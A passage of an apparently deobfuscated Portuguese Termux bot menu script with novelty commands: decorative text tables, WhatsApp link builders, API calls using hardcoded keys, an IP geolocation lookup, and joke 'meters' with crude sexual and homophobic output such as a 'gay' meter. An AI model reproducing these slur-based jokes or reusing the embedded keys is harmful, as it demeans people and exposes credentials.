      console.clear(),
        console.log(
          color(
            '\n\n\uD835\uDD4B\uD835\uDD38\uD835\uDD39\uD835\uDD3C\uD835\uDD43\uD835\uDD38 ℙ\uD835\uDD38ℝ\uD835\uDD38 ℕ\uD835\uDD40ℂ\uD835\uDD42\uD835\uDD4A \uD835\uDD3C \uD835\uDD4A\uD835\uDD40\uD835\uDD44\uD835\uDD39\uD835\uDD46\uD835\uDD43\uD835\uDD46\uD835\uDD4A \uD835\uDD38\uD835\uDD4B\uD835\uDD4C\uD835\uDD38\uD835\uDD43\uD835\uDD40ℤ\uD835\uDD38\uD835\uDD3B\uD835\uDD46\uD835\uDD4A\n)\xBB Texto Designs \u2666\u266B\u207A\u2666\uFF65*:..\uFF61\u2666\u266B\u207A\u2666*ﾟ\xA8ﾟﾟ\uFF65*:..\uFF61\u2666\u266B\u207A\u2666*ﾟTexto\xA8ﾟﾟ\uFF65*:..\uFF61\u2666\u266B\u207A\u2666*ﾟ\xA8ﾟ\uFF65*:..\uFF61\u2666\u266B\u207A\u2666*\n\n- Para Decorar o Banner perfil Status ETC .\no\u25CB\uFF61o\u25CBﾟ\uFF65*:.\uFF61. .\uFF61.:*\uFF65\u309C\u25CBo\uFF61\u25CBo\uFF61ﾟ\uFF65*:.\uFF61. .\uFF61.:*\uFF65\u309C\uFF61o\u25CB\uFF61o\u25CBﾟ\uFF65*:.\uFF61.\n\n\u266A\u2606\u2605\uFF1A\uFF1B\u30FB\uFF0A\uFF1B\uFF1A\u266A\u2606\u2605\uFF1A\uFF1B\u30FB\uFF0A\uFF1B\uFF1A\u266A\u2606\u2605\n\n\u2666\u266B\u207A\u2666\uFF65*:..\uFF61\u2666\u266B\u207A\u2666*ﾟ\xA8ﾟﾟ\uFF65*:..\uFF61\u2666\u266B\u207A\u2666*ﾟ\xA8ﾟﾟ\uFF65*:..\uFF61\u2666\u266B\u207A\u2666*ﾟ\xA8ﾟ\uFF65*:..\uFF61\u2666\u266B\u207A\u2666*\n\n\u2704ฺ\u2014\u2014\u2014 ｷ \u2014- ﾘ \u2014- ﾄ \u2014- ﾘ \u2014\u2014\u2014\u2014\u2014-\n\n.\u2606.\u30FB\u2234.\u30FB\u2235\u2606:*\u30FB\u2235.:*\u30FB\u2606.\u2606.\u3002.:*,\u2605 :*\u30FB\u2235.:\u2606.\u3002.:*\u30FB:*\u30FB\u2235.\u2606:*\u30FB\u2235.\u309C\n\n\n*:..\uFF61o\u25CBヽ(\u25CB\uFF65v\uFF65\u25CF)ﾉ\u25CBo\uFF61.:*:.\uFF61o\u25CBヽ(\u25CB\uFF65v\uFF65\u25CF)ﾉ\u25CBo\uFF61.:*:.\n\n\u2660\uFF0B\u3002:;\u309C;:\u3002\uFF0B\u2660 \u3002:;\u309C;:\uFF0B\u2660\u3002:;\u309C;:\u3002\uFF0B\u2660\u3002:;\u309C;:\u3002\uFF0B\n\n\n\u25CF\xB4Å\uFF40\u25CF人\u25CB\xB4Å\uFF40\u25CB人\u25CF\xB4Å\uFF40\u25CF人\u25CB\xB4Å\uFF40\u25CB人\u25CF\xB4Å\uFF40\u25CF\n\n\n\u25A1\u25A0*:;;;:*\u25A1\u25A0*:;;;:*\u25A0\u25A1*:;;;:*\u25A0\u25A1*:;;;:*\u25A1\u25A0*:;;;:*\u25A1\u25A0\n\n\n\u3013\u266A\u3013\u266A\u3013\u266A\u3013\u266A\u3013\u266A\u3013\u266A\u3013\u266A\u3013\u266A\u3013\u266A\u3013\u266A\n\n\u2606\u309C+\uFF0E\uFF0E+\u309C\u2606\u309C+\uFF0E\uFF0E+\u309C\u2606\u309C+\uFF0E\uFF0E+\u309C\u2606\u309C+\uFF0E\uFF0E+\u309C\u2606\u309C+\uFF0E\uFF0E+\u309C\u2606\u309C+\uFF0E\uFF0E+\u309C\u2606\n\n\n\u2605\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u2605\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u2605\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u2605\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u2605\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u2605\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u30FB\u2605\n\n\n\u2606:;;::;;:*:;;::;;:*:;;::;;:*:;;::;;:*:;;::;;:\u2606:;;::;;:*:;;::;;:*:;;::;;:*:;;::;;:*:;;::;;:\u2606\n\n\n+\u25A1+\u25A0+\u25A1+\u25A0+\u25A1+\u25A0+\u25A1+\u25A0+\u25A1+\u25A0+\u25A1+\u25A0+\u25A1+\u25A0+\u25A1+\u25A0+\n\n\n\u3002.+\u2020*:.\u3002.+\u2020*:.\u3002.+\u2020*:.\u3002.+\u2020*:.\u3002.+\u2020*:.\u3002\n\n\n\uFF08\u25CF^Д^\uFF09\uFF09~\u30FB\u3002\u30FB\u2606\u30FB\u3002\u30FB~\uFF08\uFF08\uFF3EД^\u25CF\uFF09\u2606\uFF08\u25CF^Д^\uFF09\uFF09~\u30FB\u3002\u30FB\u2606\u30FB\u3002\u30FB~\uFF08\uFF08\uFF3EД^\u25CF\uFF09\n\n\n\u2660,.:*:.,\u2660.,:*:,.\u2660,.:*:.,\u2660,.:*:.,\u2660,.:*:.,\u2660\n\n\u266C.:*ε３.:*\u266C.:*ε３.:*\u266C.:*ε３.:*\u266C.:*ε３.:*\u266C.:*ε３.:*\u266C.:*ε３.:*\n\n\u3002\u3002\u3002\u3002\u3002\u3002\u3002\u3002\u3002〆(\u2200\uFF40*)\u3002\u3002\u3002\u3002\u3002\u3002\u3002\u3002\u3002〆(\u2200\uFF40*)\u3002\u3002\u3002\u3002\u3002\u3002\u3002\u3002\u3002〆(\u2200\uFF40*)\n\nOo\uFF61-y(ω\uFF65)Oo\uFF61-y(ω\uFF65)Oo\uFF61-y(ω\uFF65 Oo\uFF61-y(ω\uFF65)Oo\uFF61-y(ω\uFF65 )Oo\uFF61-y(ω\uFF65\n\n\n*\uFF1C(\u25CF ﾉ*０\u30FBﾟ\u30FB*:.\u3002..\u3002.:*０\u30FBﾟ\u30FB*:.\u3002. .\u3002.:*０\u30FBﾟ\u30FB*ヽ(\xB4ε \u25CF)\uFF1E*\n\n..,:*:,..,:*:,..,:*:,..,:*:\n\n\u30FB\u3002\uFF0E:\uFF0A(\u30FBω\u30FB)\u30FB\u3002\uFF0E:\uFF0A(\u30FBu\u30FB)\u30FB\u3002\uFF0E:\uFF0A(\u30FBv\u30FB)\u30FB\u3002\uFF0E:\uFF0A\n\n\nﾟ.:\uFF61+ﾟ.:\uFF61\u2020ﾟ.:\uFF61+ﾟ.:\uFF61\u2020ﾟ.:\uFF61+ﾟ.:\uFF61\u2020ﾟ.:\uFF61+ﾟ.:\uFF61\u2020ﾟ.:\uFF61+ﾟ.:\uFF61\u2020ﾟ.:\uFF61+ﾟ.:\uFF61\u2020\n\n\u266A\uFF5E\uFF5E\u266A\uFF5E\uFF5E\u266A\uFF5E\uFF5E\u266A\uFF5E\uFF5E\u266A\uFF5E\uFF5E\u266A\uFF5E\uFF5E\u266A\n\n\uFF5E\u25CF\uFF5E\u25CF\uFF5E\u25CF\uFF5E\u25CF\uFF5E\u25CF\uFF5E\u25CF\uFF5E\u25CF\uFF5E\u25CF\uFF5E\u25CF\uFF5E\u25CF\uFF5E\n\n+ \u309C *\u3002(\u25CF\xB4Д\uFF40人\xB4Д\uFF40\u25CF)\u3002* \u309C + \u309C\u3000\uFF0A\u3002\uFF08\u25CF\xB4Д\uFF40人\xB4Д\uFF40\u25CF\uFF09\u3002\uFF0A\u3000\u309C\u3000\uFF0B\n\n\u2312.+\u25C6*.\u2312.+\u25C7*.\u2312\n\n(\xB4\u30FBω\u30FB*)\u2606\u3002\u30FB:\u309C*::::::::::::::::::::::::::::::*\u309C:\u30FB\u3002\u2606(*\u30FBω\uFF1C\uFF09\n\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\n\n\u2605\u25CBo\uFF61..:*\u3011\u2605\u25CBo\uFF61..:*\u3011\u2605\u25CBo\uFF61..:*\u3011\u2605\u25CBo\uFF61..:*\u3011\u2605\u25CBo\uFF61..:*\u3011\u2605\u25CBo\uFF61..:*\u3011\u2605\u25CBo\uFF61..\n\n\n\u2605\u309C+\u3002*:\u309C+\u3002*:\u309C+\u3002*:\u309C+\u3002*:\u309C+\u3002*:\u309C\u3002+*:\u309C+\u3002*:\u309C+\u3002*:\u309C+\u3002*:\u2606\n\n\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\u2661\u2665\n\n\u25C7\u2312\u2665\u2312\u2661\u2312\u2665\u2312\u2661\u2312\u2665\u2312\u2661\u2312\u25C7\n\n\u2605\u2605\u2605\u2605\u2605\u2605\xB4\u25BD\uFF40\u2605\u2605\u2605\u2605\u2605\u2605\n\n(*ﾟ\u2200ﾟ)\u253C\u253C\u253C\u253C\u253C\u253C\u253C\u253C\u253C\u253C\u253C\u253C\u253C\u253C\u253C(ﾟ\u2200ﾟ*)\n\n\u2591\u2592\u2593\u2588 \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\n\nｏ\uFF08\uFF65ω\uFF65ｏ\uFF09\uFF08ｏ\uFF65ω\uFF65\uFF09ｏ ｏ\uFF08\uFF65ω\uFF65ｏ\uFF09\uFF08ｏ\uFF65ω\uFF65\uFF09ｏ ｏ\uFF08\uFF65ω\uFF65ｏ\uFF09\uFF08ｏ\uFF65ω\uFF65\uFF09ｏ\n\n\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\u2666\u266B.\u3002\u30FB*\u309C*\u30FB\u3002.\u2666\u266B\n\n\n\u25CB+\u3002\uFF0E*\uFF0E\u3002+\u25CB+\u3002\uFF0E*\uFF0E\u3002+\u25CB+\u3002\uFF0E*\uFF0E\u3002+\u25CB+\u3002\uFF0E*\uFF0E\u3002+\u25CB+\u3002\uFF0E*\uFF0E\u3002+\u25D5‿\u25D5\uFF61 \uD83C\uDF38\n\nBy Venom Mods \n\n',
            'pink'
          )
        ),
        await sleep(6000),
        main()
      break
    case 'tabela6':
      console.clear(),
        console.log(
          color(
            '\n\n\uD835\uDC47\uD835\uDC34\uD835\uDC35\uD835\uDC38\uD835\uDC3F\uD835\uDC34 \uD835\uDC37\uD835\uDC38 \uD835\uDC3F\uD835\uDC38\uD835\uDC47\uD835\uDC45\uD835\uDC34\uD835\uDC46 \uD835\uDC34\uD835\uDC47\uD835\uDC48\uD835\uDC34\uD835\uDC3F\uD835\uDC3C\uD835\uDC4D\uD835\uDC34\uD835\uDC37\uD835\uDC34\uD83C\uDE2F\uD83D\uDCA323/10/20 \uD808\uDD2C  ͢\uD835\uDC73\uD835\uDC86\uD835\uDC90 \uD835\uDC90\uD835\uDC87 \uD835\uDC6F\uD835\uDC82\uD835\uDC8A\uD835\uDC8C\uD835\uDC9A\uD835\uDC96\uD835\uDC96 ツ\n\n\uD83D\uDC40\uD835\uDC0E\uD835\uDC01\uD835\uDC12: \uD835\uDC12\uD835\uDC1A\uD835\uDC25\uD835\uDC2F\uD835\uDC1A \uD835\uDC27\uD835\uDC28 \uD835\uDC01\uD835\uDC25\uD835\uDC28\uD835\uDC1C\uD835\uDC28 \uD835\uDC1D\uD835\uDC1E \uD835\uDC0D\uD835\uDC28\uD835\uDC2D\uD835\uDC1A\uD835\uDC2C\n\n\uD835\uDC7B\uD835\uDC68\uD835\uDC69\uD835\uDC6C\uD835\uDC73\uD835\uDC68 \uD835\uDC6B\uD835\uDC6C \uD835\uDC73\uD835\uDC6C\uD835\uDC7B\uD835\uDC79\uD835\uDC68\uD835\uDC7A ツ\n\uD835\uDEE2 \uD835\uDEE5 \uD835\uDEEC \uD835\uDEB2 \uD835\uDF1C \uD835\uDF1F \uD835\uDF35 \uD835\uDC34 \uD835\uDC00 \uD835\uDC68 \uD835\uDE70 卂 么 入 刄 公\nB \uD835\uDEE3 \uD835\uDEA9 \uD835\uDF1D \uD835\uDC35 ℬ \uD835\uDCD1 \uD835\uDD6D 乃 岌 多仍 \nC \uD835\uDC02 \uD835\uDC6A \uD835\uDC36 \uD835\uDCD2  \uD835\uDD6E 匚 ር ℂ\nD  \uD835\uDC03 \uD835\uDC6B \uD835\uDC37 \uD835\uDCD3 ᗪ \uD835\uDD6F \nE 玄 \uD835\uDC04 \uD835\uDC6C \uD835\uDC38 \uD835\uDEAC \uD835\uDEB5 \uD835\uDEF4 \uD835\uDEEF \uD835\uDF2E \uD835\uDF29 ℰ 乇 ꏂ \nF \uD835\uDC05 \uD835\uDC6D \uD835\uDC39 ℱ \uD835\uDD71 \uD835\uDD09 千 \nG \uD835\uDC06 \uD835\uDC6E \uD835\uDC3A Ꮹ\nH \uD835\uDC07 \uD835\uDC6F \uD835\uDC3B ℋ ℌ 卄 ꫝ ዘ\nI \uD835\uDE78 \uD835\uDD5A \uD835\uDC08 \uD835\uDC70 \uD835\uDC3C \uD835\uDD26 \uD835\uDCF2 | ቾ\nJ \uD835\uDD0D \uD835\uDC09 \uD835\uDC71 \uD835\uDC3D \uD835\uDCA5  \uD835\uDCF3 \nK \uD835\uDC0A \uD835\uDC72 \uD835\uDC3E \uD835\uDEB1 \uD835\uDEEB \uD835\uDF25 \uD835\uDCA6 \nL \uD835\uDC0B \uD835\uDC73 \uD835\uDC3F ℒ \uD835\uDD77 ꪶ ㄥ廴\nM \uD835\uDC0C \uD835\uDC74 \uD835\uDC40 ℳ ᗰ \uD835\uDD78 \uD835\uDD10 ꪑ 爪 \uD835\uDEED\nN \uD835\uDC0D \uD835\uDC75 \uD835\uDC41 \uD835\uDCDD ꪀ \uD835\uDEB4 \uD835\uDEB4 ᜰ ꤾ ꡃ\nO \uD835\uDC0E \uD835\uDC76 \uD835\uDC42\uD835\uDCAA ꪮ ㄖ \uD835\uDEAF \uD835\uDEB6 \uD835\uDEF3 \uD835\uDEE9 \uD835\uDEF7 \u274D \u3004\nP \uD835\uDC0F \uD835\uDC77 \uD835\uDC43 \uD835\uDE7F ℙ \uD835\uDD7B \uD835\uDD13卩 \uD835\uDEF2 \uD835\uDF2C\nQ \uD835\uDC10 \uD835\uDC78 \uD835\uDC44 \uD835\uDD7C Ҩ\nR \uD835\uDC11 \uD835\uDC79 \uD835\uDC45 ℛ ℜ \uD835\uDD7D 尺 \nS \uD835\uDC12 \uD835\uDC7A \uD835\uDC46 丂 令\nT \uD835\uDC13 \uD835\uDC7B \uD835\uDC47 ㄒፕ \uD835\uDEBB \uD835\uDEF5 亇\nU \uD835\uDC14 \uD835\uDC7C \uD835\uDC48\uD835\uDCB0  ᑌ \uD835\uDD18 \uD835\uDD80 ꪊ ㄩび\nV \uD835\uDC15 \uD835\uDC7D \uD835\uDC49 \uD835\uDCB1  ꪜ \uD835\uDEF6 \uD835\uDF30\nW \uD835\uDC16 \uD835\uDC7E \uD835\uDC4A ᗯ ᭙ 山 ሠ \uD835\uDF14 Ꮤ ꪡ ꪝ ꤿ\nX \uD835\uDD4F \uD835\uDC17 \uD835\uDC7F \uD835\uDC4B \uD835\uDCB3  ᥊ 乂 ꉧ \uD835\uDEF8 \uD835\uDF32 ꪎ\nY \uD835\uDC18 \uD835\uDD50 \uD835\uDC80 \uD835\uDC4C ꪗ ㄚ ሃ \uD835\uDF33\nZ \uD835\uDF21 ℤ \uD835\uDC19 \uD835\uDC81 \uD835\uDC4D ɀ 乙 \uD835\uDEE7\n\nBy Venom Mods \n\n',
            'pink'
          )
        ),
        await sleep(6000),
        main()
      break
    case 'vesgo':
      let _0x4e9d23 = readline.question('\n\nDigite o seu nome: ')
      console.clear(),
        console.log(
          color(
            '\n\n\u2770 Pesquisando a ficha de vesgo : ' +
              _0x4e9d23 +
              ', aguarde... \u2771\n\n',
            'green'
          )
        ),
        (random = '' + Math.floor(Math.random() * 110)),
        (vesg =
          'O quanto você é vesgo? \n\n\u300C ' +
          _0x4e9d23 +
          ' \u300DVocê é: \u2770 ' +
          random +
          '% \u2771  Vesgo \uD83D\uDE44\uD83D\uDE06'),
        await sleep(3000),
        console.clear(),
        console.log(color('\n\n' + vesg + '\n\n', 'magenta')),
        await sleep(5000),
        main()
      break
    case 'dono':
      ;(caminho_do_audio = './dados/audios/venom.opus'),
        exec('mpv ' + caminho_do_audio),
        console.clear(),
        _0x2f38da()
      let _0x28daf3 = ownner.user
      await opn(
        'https://api.whatsapp.com/send?phone=' +
          _0x28daf3 +
          '&text=' +
          'Ola venom vin através da script Venom Bot termux \uD83E\uDD7A'
      ),
        console.log(
          color('\n\n\u2705Direciando ao WhatsApp do dono..\n\n', 'blue')
        ),
        await sleep(4000),
        main()
      break
    case 'wa.me':
    case 'gerar-link':
      console.clear()
      let _0x540720 = readline.question(
          '\n\nDigite o número tudo junto!Exemplo: 559784043928\n\nDigite o número aqui: '
        ),
        _0x481602 = readline.question(
          '\n\nDigite o titulo personalizado!\nExemplo: Venom\nSou YouTube\nSou designer\nVendo seguidores!!\n\nDigite aqui: '
        ),
        _0x1b81da = readline.question(
          '\n\nDigite o texto que sera colocado como mensagem!\nExemplo: Oie+salva+ae\n\nDigite aqui: '
        )
      console.clear(),
        _0x2f38da(),
        await opn(
          'https://api.whatsapp.com/send?phone=' +
            _0x540720 +
            '&text=' +
            _0x481602 +
            '\nhttps://wa.me/' +
            _0x540720 +
            '?text=' +
            _0x1b81da
        ),
        console.log(
          color(
            '\n\n\u2705Direciando link ao WhatsApp do usuário...\n\n',
            'blue'
          )
        ),
        await sleep(4000),
        main()
      break
    case 'conselho':
      console.clear(),
        (apikk = await fetchJson(
          'https://api-darkzy7.onrender.com/api/palavra/conselho?apikey=Darkzy7'
        )),
        console.log(color('\n\n' + apikk.conselho + '\n\n', 'blue')),
        await sleep(5000),
        main()
      break
    case 'sair':
      ;(caminho_do_audio = './dados/audios/scritpvenom.opus'),
        exec('mpv ' + caminho_do_audio),
        console.clear(),
        _0x2f38da(),
        console.log(
          color(
            '\n\nbye obrigado por usa esta script venom agradeçe \uD83D\uDE0C\u2764️\n\n',
            'magenta'
          )
        ),
        await sleep(5000),
        process.exit()
      break
    case 'gerarnick':
      try {
        let _0x404a57 = readline.question(
          'Escreveva um nome para eu enviar ele com letras modificadas, Exemplo: Venom\n  Digite o texto aqui:  '
        )
        console.clear()
        ABC = await fetchJson(
          'https://api.bronxyshost.com.br/api-bronxys/gerar_nick?nick=' +
            _0x404a57 +
            '&apikey=9784388524'
        )
        AB =
          '\n\nLista com base no Nick informado, para encontrar melhor fonte para utilizar:'
        for (i of ABC) {
          AB += '\n\n' + i
        }
        console.log(color(AB, 'blue'))
      } catch (_0x100030) {
        console.log(
          color('\n\nAlgo deu errado pode ser na api tente novamente!', 'red')
        )
      }
      await sleep(6000), console.clear(), main()
      break
    case 'ip':
      {
        ip = readline.question('Preciso do IP: ')
        if (ip) {
          try {
            console.clear()
            console.log(
              color('*CONSULTANDO IP: ' + ip + ' \uD83D\uDD0D*\n\n', 'blue')
            )
            const _0x2b67a2 = await axios.get(
                'http://ip-api.com/json/' +
                  ip +
                  '?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query'
              ),
              _0xb40e0e = _0x2b67a2.data
            let _0x54e111 =
              ' \uD83D\uDD0E \uD835\uDDD6\uD835\uDDE2\uD835\uDDE1\uD835\uDDE6\uD835\uDDE8\uD835\uDDDF\uD835\uDDE7\uD835\uDDD4 \uD835\uDDD7\uD835\uDDD8 \uD835\uDDDC\uD835\uDDE3 \uD83D\uDD0D️\n'
            _0x54e111 +=
              '\u2022 STATUS: ' +
              (_0xb40e0e.status ? _0xb40e0e.status : 'IP PRIVADO') +
              '\n'
            _0x54e111 +=
              '\u2022 IP: ' +
              (_0xb40e0e.query ? _0xb40e0e.query : 'INDEFINIDO') +
              '\n'
            _0x54e111 +=
              '\u2022 CONTINENTE: ' +
              (_0xb40e0e.continent ? _0xb40e0e.continent : 'global') +
              '\n'
            _0x54e111 +=
              '\u2022 CONTINENTE SIGLA: ' +
              (_0xb40e0e.continentCode ? _0xb40e0e.continentCode : 'GLOBAL') +
              '\n'
            _0x54e111 +=
              '\u2022 PAÍS: ' +
              (_0xb40e0e.country ? _0xb40e0e.country : 'global') +
              '\n'
            _0x54e111 +=
              '\u2022 PAÍS SIGLA: ' +
              (_0xb40e0e.countryCode ? _0xb40e0e.countryCode : 'GLOBAL') +
              '\n'
            _0x54e111 +=
              '\u2022 REGIÃO: ' +
              (_0xb40e0e.region ? _0xb40e0e.region : 'Global') +
              '\n'
            _0x54e111 +=
              '\u2022 NOME DA REGIÃO: ' +
              (_0xb40e0e.regionName ? _0xb40e0e.regionName : 'Global') +
              '\n'
            _0x54e111 +=
              '\u2022 CIDADE: ' +
              (_0xb40e0e.city ? _0xb40e0e.city : 'Global') +
              '\n'
            _0x54e111 +=
              '\u2022 LATITUDE: ' + (_0xb40e0e.lat ? _0xb40e0e.lat : '0') + '\n'
            _0x54e111 +=
              '\u2022 LONGITUDE: ' +
              (_0xb40e0e.lon ? _0xb40e0e.lon : '0') +
              '\n'
            _0x54e111 +=
              '\u2022 TEMPO REAL: ' +
              (_0xb40e0e.timezone ? _0xb40e0e.timezone : 'UTC +0') +
              '\n'
            _0x54e111 +=
              '\u2022 ISP: ' +
              (_0xb40e0e.isp ? _0xb40e0e.isp : 'PUBLICO') +
              '\n'
            _0x54e111 +=
              '\u2022 ORG: ' +
              (_0xb40e0e.org ? _0xb40e0e.org : 'IP PUBLICO') +
              '\n'
            console.log(color(_0x54e111, 'blue'))
            await sleep(6000)
          } catch (_0x524376) {
            console.error(_0x524376)
            console.log(color('Ocorreu um erro ao obter as informações', 'red'))
          }
        } else {
          console.log(
            color(
              'O IP inserido é inválido ou o número não corresponde!',
              'red'
            )
          )
          exec('node venom')
        }
        main()
      }
      break
    case 'hora':
      console.clear(),
        console.log(color('\n\nSão ' + hora + ' Horas\n\n', 'blue')),
        await sleep(5000),
        main()
      break
    case 'data':
      console.clear(),
        console.log(color('\n\nData ' + data + '\n\n', 'blue')),
        await sleep(5000),
        main()
      break
    case 'pau':
      let _0x125352 = readline.question('\n\nDigite o seu nome: ')
      console.clear(), (random = '' + Math.floor(Math.random() * 35))
      var _0x3c4511 = random
      if (_0x3c4511 < 13) {
        pp = 'só a fimose'
      } else {
        if (_0x3c4511 == 13) {
          pp = 'passou da média\uD83D\uDE33'
        } else {
          if (_0x3c4511 == 14) {
            pp = 'passou da média\uD83D\uDE33'
          } else {
            if (_0x3c4511 == 15) {
              pp = 'eita, vai pegar manga?'
            } else {
              if (_0x3c4511 == 16) {
                pp = 'eita, vai pegar manga?'
              } else {
                if (_0x3c4511 == 17) {
                  pp = 'calma man, a mina não é um poço\uD83D\uDE33'
                } else {
                  if (_0x3c4511 == 18) {
                    pp = 'calma man, a mina não é um poço\uD83D\uDE33'
                  } else {
                    if (_0x3c4511 == 19) {
                      pp = 'calma man, a mina não é um poço\uD83D\uDE33'
                    } else {
                      if (_0x3c4511 == 20) {
                        pp = 'você tem um poste no meio das pernas'
                      } else {
                        if (_0x3c4511 == 21) {
                          pp = 'você tem um poste no meio das pernas'
                        } else {
                          if (_0x3c4511 == 22) {
                            pp = 'você tem um poste no meio das pernas'
                          } else {
                            if (_0x3c4511 == 23) {
                              pp = 'você tem um poste no meio das pernas'
                            } else {
                              if (_0x3c4511 == 24) {
                                pp = 'você tem um poste no meio das pernas'
                              } else {
                                _0x3c4511 > 25 &&
                                  (pp = 'vai procurar petróleo com isso?')
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      console.log(
        color(
          '\n\n' +
            _0x125352 +
            ' Seu pau tem ' +
            random +
            'cm\n\n' +
            pp +
            '\n\n',
          'yellow'
        )
      ),
        await sleep(5000),
        main()
      break
    case 'morte':
    case 'death':
      let _0x1d89af = readline.question('\n\nDigite o seu nome: ')
      console.clear(),
        (idde = [
          '30',
          '76',
          '90',
          '72',
          '83',
          '73',
          '83',
          '74',
          '92',
          '100',
          '94',
          '48',
          '37',
          '53',
          '63',
        ]),
        (idade = idde[Math.floor(Math.random() * idde.length)]),
        (morte =
          '\n\nPessoas com este nome: ' +
          _0x1d89af +
          ' \nTendem a morrer aos ' +
          idade +
          ' anos de idade.\n\n'),
        console.log(color(morte, 'yellow')),
        await sleep(5000),
        main()
      break
    case 'gadometro':
    case 'gado':
      let _0x4b6fc6 = readline.question('\n\nDigite o seu nome: ')
      console.clear()
      var _0x29bb4e = [
          'ultra extreme gado',
          'Gado-Master',
          'Gado-Rei',
          'Gado',
          'Escravo-ceta',
          'Escravo-ceta Maximo',
          'Gacorno?',
          'Jogador De Forno Livre<3',
          'Mestre Do Frifai<3<3',
          'Gado-Manso',
          'Gado-Conformado',
          'Gado-Incubado',
          'Gado Deus',
          'Mestre dos Gados',
          'Topa tudo por buceta',
          'Gado Comum',
          'Mini Gadinho',
          'Gado Iniciante',
          'Gado Basico',
          'Gado Intermediario',
          'Gado Avançado',
          'Gado Profisional',
          'Gado Mestre',
          'Gado Chifrudo',
          'Corno Conformado',
          'Corno HiperChifrudo',
          'Chifrudo Deus',
          'Mestre dos Chifrudos',
          'Rei do Gado',
        ],
        _0x1f68c6 = _0x29bb4e[Math.floor(Math.random() * _0x29bb4e.length)]
      ;(gadop = '' + Math.floor(Math.random() * 100)),
        console.log('\n\n ' + _0x4b6fc6 + ' Você é:\n\n' + _0x1f68c6 + '\n\n'),
        await sleep(5000),
        main()
      break
    case 'chance':
      let _0x5192cd = readline.question(
        'Você precisa digitar da forma correta\nExemplo: chance do Bruno ser um trouxa\n            Dogite aqui: '
      )
      ;(random = '' + Math.floor(Math.random() * 100)),
        console.log(
          color(
            '\n\nA chance ' + _0x5192cd + '\n\né de... ' + random + '%',
            'yellow'
          )
        ),
        main()
      break
    case 'caracoroa':
      let _0x2e6d82 = readline.question(
        '\n\nVoce ecolhe cara ou coroa?\nDigite qui: '
      )
      console.clear(),
        (cararo = ['cara', 'coroa']),
        (fej = cararo[Math.floor(Math.random() * cararo.length)]),
        (gg = fej),
        (xp = Math.floor(Math.random() * 13) + 3),
        (xp1 = '\n\nVocê ganhou ' + xp + ' em xp')
      if (
        (fej == 'cara' && _0x2e6d82 == 'cara') ||
        (fej == 'coroa' && _0x2e6d82 == 'coroa')
      ) {
        var _0x1f84fe = '\n\nvitoria'
      } else {
        if (
          (fej == 'coroa' && _0x2e6d82 == 'cara') ||
          (fej == 'cara' && _0x2e6d82 == 'coroa')
        ) {
          var _0x1f84fe = '\n\nderrota'
        }
      }
      if (_0x1f84fe == '\n\nvitoria') {
        var _0x207029 = '\n\nVitória do jogador'
      }
      if (_0x1f84fe == '\n\nderrota') {
        var _0x207029 = '\n\nA vitória é do bot \uD83D\uDE0E'
      }
      console.log(
        color(
          '\n\nEscolha do jogador:   ' +
            _0x2e6d82 +
            '\nResultado:  ' +
            fej +
            '\n\n' +
            _0x207029,
          'yellow'
        )
      )
      _0x207029 == '\n\nVitória do jogador' && console.log(xp1)
      await sleep(5000), main()
      break
    case 'gay':
      {
        gayname = readline.question('\n\nDigite zeu nome: ')
        console.clear()
        random = '' + Math.floor(Math.random() * 100)
        boiola = random
        if (boiola < 20) {
          bo = 'hmm... você é hetero \uD83D\uDE14'
        } else {
          if (boiola == 21) {
            bo = '+/- boiola'
          } else {
            if (boiola == 23) {
              bo = '+/- boiola'
            } else {
              if (boiola == 24) {
                bo = '+/- boiola'
              } else {
                if (boiola == 25) {
                  bo = '+/- boiola'
                } else {
                  if (boiola == 26) {
                    bo = '+/- boiola'
                  } else {
                    if (boiola == 27) {
                      bo = '+/- boiola'
                    } else {
                      if (boiola == 28) {
                        bo = '+/- boiola'
                      } else {
                        if (boiola == 29) {
                          bo = '+/- boiola'
                        } else {
                          if (boiola == 30) {
                            bo = '+/- boiola'
                          } else {
                            if (boiola == 31) {
                              bo = 'tenho minha desconfiança...\uD83D\uDE11'
                            } else {
                              if (boiola == 32) {
                                bo = 'tenho minha desconfiança...\uD83D\uDE11'
                              } else {
                                if (boiola == 33) {
                                  bo = 'tenho minha desconfiança...\uD83D\uDE11'
                                } else {
                                  if (boiola == 34) {
                                    bo =
                                      'tenho minha desconfiança...\uD83D\uDE11'
                                  } else {
                                    if (boiola == 35) {
                                      bo =
                                        'tenho minha desconfiança...\uD83D\uDE11'
                                    } else {
                                      if (boiola == 36) {
                                        bo =
